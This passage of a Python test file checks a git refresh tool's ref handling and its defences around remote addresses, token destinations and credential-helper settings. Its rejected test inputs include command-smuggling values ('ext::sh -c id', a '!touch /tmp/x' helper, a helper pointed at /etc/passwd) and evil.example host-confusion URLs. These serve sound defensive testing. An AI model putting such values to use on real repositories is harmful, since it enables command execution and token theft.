        return self.push_from_other("greeting.txt", "two\n")

    def test_the_tracking_branch_and_the_private_tip_both_move_in_one_fetch(self):
        new = self.behind_by_one()
        self.assertNotEqual(self.git("rev-parse", "origin/main").stdout.strip(), new)
        answer, calls, _ = self.recorded_run()
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(self.git("rev-parse", "origin/main").stdout.strip(), new)
        self.assertEqual(self.git("rev-parse", "refs/sdlca/refresh-tip").stdout.strip(), new)
        self.assertEqual(len([call for call in calls if "fetch" in call]), 1)  # one round trip for both
        reflog = self.git("reflog", "show", "--format=%H %gs", "refs/remotes/origin/main").stdout.splitlines()
        self.assertTrue(reflog[0].startswith(new + " fetch "), reflog)  # git wrote the reflog of the tracking branch: what fork-point reads
        self.assertTrue(reflog[0].endswith(": fast-forward"), reflog)

    def test_the_branch_the_clone_follows_is_the_one_whose_ref_is_written_whatever_the_fetch_rule_says(self):
        self.git("config", "remote.origin.fetch", "+refs/heads/main:refs/remotes/origin/trunk")
        self.git("update-ref", "refs/remotes/origin/trunk", self.head())
        old = self.git("rev-parse", "origin/main").stdout.strip()
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.git("rev-parse", "refs/remotes/origin/trunk").stdout.strip(), new)
        self.assertEqual(self.git("rev-parse", "origin/main").stdout.strip(), old)  # the clone's rule does not follow the branch there: not written

    def test_a_tracking_branch_that_was_deleted_is_made_again(self):
        self.git("update-ref", "-d", "refs/remotes/origin/main")
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.git("rev-parse", "refs/remotes/origin/main").stdout.strip(), new)

    def test_a_fetch_rule_that_puts_the_branch_outside_refs_remotes_writes_no_tracking_ref(self):
        self.git("config", "remote.origin.fetch", "+refs/heads/*:refs/mirror/*")
        self.git("update-ref", "refs/mirror/main", self.head())
        new = self.behind_by_one()
        answer, calls, _ = self.recorded_run()
        self.assertAnswer(answer, "updated", "ok")
        fetch = next(call for call in calls if "fetch" in call)
        self.assertEqual(fetch[fetch.index("--") + 2:], ["+refs/heads/main:refs/sdlca/refresh-tip"])  # only the private tip
        self.assertEqual(self.git("rev-parse", "refs/mirror/main").stdout.strip(), self.git("rev-parse", "HEAD~1").stdout.strip())

    def test_the_tracking_ref_is_named_by_git_and_must_be_a_plain_ref_under_refs_remotes(self):
        class Fake:
            def __init__(self, out, returncode=0):
                self.out, self.returncode = out, returncode

            def run(self, *args):
                return self.returncode, self.out, ""

        for out, expected in (("refs/heads/main refs/remotes/origin/main\n", "refs/remotes/origin/main"),
                              ("refs/heads/main \n", None), ("refs/heads/main refs/heads/main\n", None),
                              ("refs/heads/main refs/remotes/origin/ma in\n", None), ("refs/heads/main refs/remotes/a:b\n", None),
                              ("refs/heads/main refs/remotes/a*\n", None), ("refs/heads/other refs/remotes/origin/main\n", None),
                              ("refs/heads/main refs/sdlca/refresh-tip\n", None), ("", None)):
            with self.subTest(out=out):
                self.assertEqual(refresh.tracking_ref(Fake(out), "main"), expected)
        self.assertIsNone(refresh.tracking_ref(Fake("refs/heads/main refs/remotes/origin/main\n", returncode=128), "main"))
        self.assertFalse(refresh.moved_back(Fake(""), "0" * 40, None))  # with no tracking branch the world moving back cannot be seen: "no", not an error

    def test_a_world_that_moved_back_is_still_seen_after_updates_through_the_address(self):
        """The test of the reflog logic end to end: the update that brought the clone forward is the one that recorded the commit that the world then removed."""
        older = self.head()
        removed = self.push_from_other("secret.txt", "a leaked secret\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.git("push", "-q", "--force", "origin", older + ":refs/heads/main", cwd=self.other)
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "diverged")
        self.assertIn("moved back", answer.text)
        self.assertEqual(self.head(), removed)
        self.assertEqual(self.git("merge-base", "--fork-point", "origin/main", "HEAD").stdout.strip(), removed)  # what git itself reads from that reflog


class AddressFunctionTests(unittest.TestCase):
    """The functions behind the comparison, without a clone."""

    def key(self, raw):
        url = gitcred.parse_url(raw)
        return None if url is None else refresh.address_key(url)

    def test_spellings_of_one_address_have_one_key(self):
        groups = (
            ("https://git.spawn.co/@a/g.git", "HTTPS://GIT.SPAWN.CO/@a/g.git", "https://git.spawn.co/@a/g", "https://git.spawn.co/@a/g/", "https://git.spawn.co/@a/g.git/",
             "https://git.spawn.co/@a/g.git//"),
            ("https://git.spawn.co", "https://git.spawn.co/", "https://GIT.spawn.co//"),
            ("https://[::1]:8443/x.git", "https://[::1]:8443/x", "HTTPS://[::1]:8443/x/"),
            ("http://127.0.0.1:8080/world.git", "http://127.0.0.1:8080/world"),
            ("file:///tmp/w/world.git", "file:///tmp/w/world", "FILE:///tmp/w/world.git/"),
        )
        for group in groups:
            with self.subTest(group=group[0]):
                self.assertIsNotNone(self.key(group[0]))
                self.assertEqual({self.key(raw) for raw in group}, {self.key(group[0])})

    def test_addresses_that_differ_have_different_keys(self):
        distinct = (
            "https://git.spawn.co/@a/g.git", "https://git.spawn.co/@a/h.git", "https://git.spawn.co/@A/g.git", "https://git.spawn.co/@a/g.git.git", "https://git.spawn.co/a/g.git",
            "https://git.spawn.co:443/@a/g.git", "https://git.spawn.co:8443/@a/g.git", "http://git.spawn.co/@a/g.git", "https://git.spawn.com/@a/g.git",
            "https://git.spawn.co.evil.example/@a/g.git", "https://evil.git.spawn.co/@a/g.git", "https://git.spawn.co./@a/g.git", "https://gitspawn.co/@a/g.git",
            "https://127.0.0.1/@a/g.git", "https://127.1/@a/g.git", "https://2130706433/@a/g.git", "https://0x7f.0.0.1/@a/g.git",
            "https://[::1]/@a/g.git", "https://[0:0:0:0:0:0:0:1]/@a/g.git", "https://[::2]/@a/g.git", "https://[::1]:8443/@a/g.git",
            "file:///@a/g.git", "https://git.spawn.co//@a/g.git", "https://git.spawn.co/@a//g.git", "https://git.spawn.co/@a/.git",
        )
        keys = [self.key(raw) for raw in distinct]
        self.assertNotIn(None, keys)
        self.assertEqual(len(set(keys)), len(distinct), [raw for raw, key in zip(distinct, keys) if keys.count(key) > 1])

    def test_user_information_and_odd_shapes_have_no_address_at_all(self):
        for raw in ("https://bob@git.spawn.co/@a/g.git", "https://" + "bob:pw" + "@git.spawn.co/@a/g.git",  # check-secrets:allow
                    "https://git.spawn.co@evil.example/@a/g.git", "https://evil.example\\@git.spawn.co/@a/g.git", "https://git.spawn.co/@a/g.git?x=1", "https://git.spawn.co/@a/g.git#x",
                    "https://git.spawn.co/@a/ g.git", "https://git.spawn.co/@a/g.git\n", "https://git.spawn.co:/@a/g.git", "https://git.spawn.co:0/@a/g.git",
                    "https://git.spawn.co:65536/@a/g.git", "https:///@a/g.git", "git.spawn.co/@a/g.git", "/tmp/g.git", "ssh://git@git.spawn.co/g.git", "",
                    "https://exämple.com/g.git", "https://[::1/g.git", "x" * 3000):
            with self.subTest(raw=raw[:40]):
                self.assertIsNone(refresh.recorded_address(raw))
        for raw in ("https://git.spawn.co/a/../b.git", "https://git.spawn.co/a/./b.git", "https://git.spawn.co/a/%2e%2e/b.git", "https://git.spawn.co/a/%2E./b.git",
                    "https://git.spawn.co/a/.%2e/b.git", "https://git.spawn.co/.."):
            with self.subTest(raw=raw):
                self.assertIsNone(self.key(raw))  # not compared at all: a client may resolve the dots
                self.assertIsNone(refresh.recorded_address(raw))

    def test_a_recorded_address_may_be_https_http_or_file_and_nothing_else(self):
        for raw in ("https://git.spawn.co/@a/g.git", "http://127.0.0.1:8080/world.git", "file:///tmp/world.git", "HTTPS://Git.Spawn.CO/x"):
            self.assertIsNotNone(refresh.recorded_address(raw), raw)
        for raw in ("ssh://git.spawn.co/x.git", "git://git.spawn.co/x.git", "ftp://git.spawn.co/x.git", "ext::sh -c id", "git+ssh://git.spawn.co/x.git", "-", "--help"):
            self.assertIsNone(refresh.recorded_address(raw), raw)

    def test_a_token_goes_only_to_https_or_to_this_machine(self):
        origin = lambda raw: refresh.token_origin(gitcred.parse_url(raw))  # noqa: E731
        self.assertEqual(origin("https://git.spawn.co/x"), ("https", "git.spawn.co", ""))
        self.assertEqual(origin("HTTPS://Git.Spawn.CO:8443/x"), ("https", "git.spawn.co", "8443"))
        self.assertEqual(origin("http://127.0.0.1:8080/x"), ("http", "127.0.0.1", "8080"))
        self.assertEqual(origin("http://localhost/x"), ("http", "localhost", ""))
        for raw in ("http://git.spawn.co/x", "http://127.0.0.1.evil.example/x", "http://localhost.evil.example/x", "http://[::1]/x", "file:///x", "file://localhost/x"):
            self.assertIsNone(origin(raw), raw)

    def test_the_scope_of_a_helper_is_a_bare_http_or_https_origin(self):
        self.assertEqual(refresh.scope_origin("https://git.spawn.co"), ("https", "git.spawn.co", ""))
        self.assertEqual(refresh.scope_origin("https://git.spawn.co:8443"), ("https", "git.spawn.co", "8443"))
        self.assertEqual(refresh.scope_origin("http://127.0.0.1:8080"), ("http", "127.0.0.1", "8080"))
        for scope in ("https://git.spawn.co/", "https://git.spawn.co/x", "https://*.spawn.co", "https://user@git.spawn.co", "ftp://git.spawn.co", "git.spawn.co", "https://", ""):
            self.assertIsNone(refresh.scope_origin(scope), scope)

    def test_a_credential_helper_is_judged_by_where_it_is_scoped(self):
        home = "/home/u/.sdlca/spawn"
        own = home + "/accounts/alice/token"
        env = {"SDLCA_SPAWN_HOME": home, "SPAWN_TOKEN_FILE": own}
        kits = gitcred.helper_command("alice_helper", own)
        spawn = ("https", "git.spawn.co", "")
        risky = lambda key, value, origin: refresh.risky_setting(key, value, env, origin)  # noqa: E731
        self.assertFalse(risky("credential.https://git.spawn.co.helper", kits, spawn))
        self.assertFalse(risky("credential.https://Git.Spawn.CO.helper", kits, spawn))  # git matches the host without regard to case
        self.assertFalse(risky("credential.https://git.spawn.co.helper", "", spawn))
        self.assertFalse(risky("credential.helper", "", spawn))  # the empty helper that clears the list
        self.assertFalse(risky("credential.http://127.0.0.1:8080.helper", kits, ("http", "127.0.0.1", "8080")))
        for key, value, origin in (
            ("credential.https://evil.example.helper", kits, spawn), ("credential.https://evil.example.helper", "", spawn),  # another origin, even an empty helper
            ("credential.https://git.spawn.co.helper", kits, None),  # no origin to be scoped to
            ("credential.https://git.spawn.co:8443.helper", kits, spawn), ("credential.https://git.spawn.co.helper", kits, ("https", "git.spawn.co", "8443")),
            ("credential.http://git.spawn.co.helper", kits, spawn), ("credential.https://git.spawn.co.evil.example.helper", kits, spawn),
            ("credential.https://git.spawn.co/@a/g.git.helper", kits, spawn), ("credential.https://*.spawn.co.helper", kits, spawn),
            ("credential.https://bob@git.spawn.co.helper", kits, spawn), ("credential.helper", kits, spawn), ("credential.helper", "store", spawn),
            ("credential.https://git.spawn.co.helper", gitcred.helper_command("alice_helper", "/etc/passwd"), spawn),  # the right origin, but another file
            ("credential.https://git.spawn.co.helper", "!touch /tmp/x", spawn),
        ):
            with self.subTest(key=key, value=value[:14], origin=origin):
                self.assertTrue(risky(key, value, origin))

    def test_a_remote_is_shown_by_its_name_only_when_it_is_plainly_a_name(self):
        for name in ("origin", "upstream", "my.remote", "group/remote", "a" * 40):
            self.assertEqual(refresh.remote_label(name), name)
        for name in ("https://evil.example/x.git", "git@evil.example:x.git", "a" * 41, "a b", "x?y", "x#y", "x@y", "x:y"):
            self.assertEqual(refresh.remote_label(name), "(a name that is not plain)", name)

    def test_where_an_address_points_is_a_host_and_nothing_more(self):
        where = lambda raw: refresh.where(gitcred.parse_url(raw))  # noqa: E731
        self.assertEqual(where("https://Git.Spawn.CO/@a/secret.git"), "host git.spawn.co")
        self.assertEqual(where("https://git.spawn.co:8443/@a/secret.git"), "host git.spawn.co:8443")
        self.assertEqual(where("file:///tmp/secret.git"), "a local file address")
        self.assertEqual(where("https://" + "bob:pw" + "@git.spawn.co/secret.git"), "an address that is not a plain URL")  # check-secrets:allow
        self.assertEqual(where("/tmp/secret.git"), "an address that is not a plain URL")
        self.assertEqual(len(where("https://" + "a" * 300 + ".example/x")), len("host ") + 50)


if __name__ == "__main__":
    unittest.main()
